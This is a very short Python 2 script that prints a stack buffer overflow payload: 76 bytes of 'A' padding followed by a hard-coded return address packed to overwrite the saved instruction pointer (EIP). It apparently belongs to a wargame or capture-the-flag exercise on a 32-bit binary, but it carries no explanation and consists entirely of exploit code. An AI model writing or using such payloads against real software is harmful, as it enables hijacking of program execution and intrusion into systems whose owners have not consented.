import struct
EIP = struct.pack("I", 0xbffff211)
pad = "A"
print pad * 76 + EIP

